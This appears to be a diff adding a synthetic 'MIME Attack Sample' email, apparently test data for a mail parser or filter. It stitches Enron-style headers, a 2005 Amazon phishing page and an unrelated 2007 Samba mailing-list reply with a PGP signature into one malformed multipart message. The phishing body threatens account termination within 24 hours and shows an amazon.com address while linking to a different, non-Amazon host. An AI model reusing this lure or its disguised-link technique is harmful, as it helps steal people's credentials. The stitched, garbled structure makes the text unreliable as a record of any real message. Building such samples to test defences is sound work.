@@ -1,0 +1,109 @@
+From: henry.emery@ubspainewebber.com
+To: james.steffes@enron.com, alan.comnes@enron.com, ray.alvarez@enron.com, 
+Subject: MIME Attack Sample
+Content-Type: multipart/mixed; boundary="BOUNDARY"
+--BOUNDARY
+Content-Type: text/html
+Content-Type: text/html
+Content-Transfer-Encoding: 8bit
+Message-Id: <E1EjxPo-0006VN-Qa@albergue.hospedajededicado.com>
+Date: Wed, 07 Dec 2005 12:24:52 +0100
+X-AntiAbuse: This header was added to track abuse, please include it with any abuse report
+X-AntiAbuse: Primary Hostname - albergue.hospedajededicado.com
+X-AntiAbuse: Original Domain - example.com
+X-AntiAbuse: Originator/Caller UID/GID - [99 99] / [47 12]
+X-AntiAbuse: Sender Address Domain - albergue.hospedajededicado.com
+X-Source: 
+X-Source-Args: 
+X-Source-Dir: 
+Status: O
+X-Status: 
+X-Keywords:                  
+X-UID: 250
+
+<HTML>
+<IMG src="http://g-images.amazon.com/images/G/01/nav2/images/skins/teal/logo-off.gif"
+border=0></A>  <TABLE cellSpacing=0 cellPadding=0 width=600
+align=center border=0> <TBODY> <TR> <TD colSpan=3><IMG height=2
+src="pp.files/pixel.gif"  width=2></TD></TR></TBODY></TABLE> <P><FONT
+size=2><FONT face=Verdana>Dear<STRONG><STRONG><SPAN
+style="FONT-SIZE: 10pt; COLOR: black; FONT-FAMILY: 
+Verdana">Amazon<SUP></SUP></SPAN></STRONG></STRONG>member</FONT>,<BR></FONT><BR></P>
+<P><FONT face=Verdana size=2>It has come to our attention that
+your<SPAN style="FONT-SIZE: 10pt; COLOR: black; FONT-FAMILY:
+Verdana"><STRONG>Amazon<SUP></SUP></STRONG></SPAN> order Information 
+records are <BR>out of date.That requires you to update
+the order Information If you could<BR>please take
+5-10 minutes out of your online</FONT><FONT face=Verdana size=2><FONT face=Verdana size=2>
+experience and update<BR>your order records, </FONT><FONT
+face=Verdana size=2> you</FONT><FONT face=Verdana size=2> will not run into any future problems with Amazon<BR>online service.
+</FONT><FONT face=Verdana size=2>
+<BR></FONT></P>
+<P><FONT face=Verdana size=2>However, failure to update your records will
+result in account termination.<BR>Please update your records in maximum 24 hours.</STRONG></FONT><BR><BR>Once you have updated
+records, your<SPAN style="FONT-SIZE: 10pt; COLOR: black; 
+FONT-FAMILY: Verdana"><STRONG>Amazon<SUP></SUP></STRONG></SPAN> session
+will not be<BR>interrupted and will continue as normal. </FONT></P>
+<P><FONT face=Verdana size=2>To update your <SPAN style="FONT-SIZE: 10pt;
+COLOR: black; FONT-FAMILY:
+Verdana"><STRONG>Amazon<SUP></SUP></STRONG></SPAN> order Information click on the
+following link:<BR></FONT><A
+href="http://ns4.propel.ne.jp/~yama/pula.html"target=_self><FONT
+face=Verdana
+size=2>http://www.amazon.com/gp/css/homepage.html/ref=cs_top_nav_ya</FONT></A></P>
+<P><FONT face=Verdana size=2></FONT></P> <P><FONT face=Verdana
+size=2>Thank you for your time! <BR><SPAN style="FONT-SIZE:  10pt; COLOR: black; 
+FONT-FAMILY: Verdana"><STRONG>Amazon<SUP> </SUP><SPAN style="FONT-SIZE: 
+10pt; COLOR: black; FONT-FAMILY: Verdana">Security </SPAN></STRONG><SPAN
+style="FONT-SIZE: 10pt; COLOR: black; FONT-FAMILY:
+Verdana"><STRONG>Departament</STRONG></SPAN></SPAN>
+
+</FONT></P>
+<P><FONT face=Verdana size=2>  <TABLE cellSpacing=0 cellPadding=0 width=600
+align=center border=0> <TBODY> <TR> <TD colSpan=3><IMG height=2
+src="pp.files/pixel.gif"  width=2></TD></TR></TBODY></TABLE> <P><FONT
+size=2><FONT face=Verdana>
+</HTML>
+
+
+Content-Disposition: attachment; filename=signature.asc
+Content-Type: text/plain
+-BEGIN PGP SIGNED MESSAGE-----
+Hash: SHA1
+
+Karolin,
+
+> Author: kseeger
+> Date: 2007-06-04 10:40:47 +0000 (Mon, 04 Jun 2007)
+> New Revision: 1120
+> 
+> WebSVN: http://websvn.samba.org/cgi-bin/viewcvs.cgi?view=rev&root=samba-docs&rev=1120
+> 
+> Log:
+> Add documentation for 'winbind:rpc only' in smb.conf manpage.
+> @Jerry: Please revert if your are not content with this.
+> 'ldapsam:trusted and 'ldapsam:editposix' are described in 
+> the smb.conf manpage, too.
+
+I would really like to see the parameteric options
+moved out to the relevant individual man pages.
+For example, IIRC volker add the "rpc only" option
+to winbindd(8).  The ldapsam options should be
+moved to a pdb_ldapsam(8) man pages (once we have one).
+
+Please revert this from the gargantuan smb.conf(5). :-)
+Thanks.
+
+
+
+cheers, jerry
+-----BEGIN PGP SIGNATURE-----
+Version: GnuPG v1.4.6 (GNU/Linux)
+Comment: Using GnuPG with Mozilla - http://enigmail.mozdev.org
+
+iD8DBQFGZAxmIR7qMdg1EfYRAkE+AJ4nObATtgfCgc4vYT6jeLt2KUqHKwCfUX4b
+8xDNilOEsJ3keO4TOhvKnuI=
+=7QSR
+-----END PGP SIGNATURE-----
+
+-BOUNDARY--
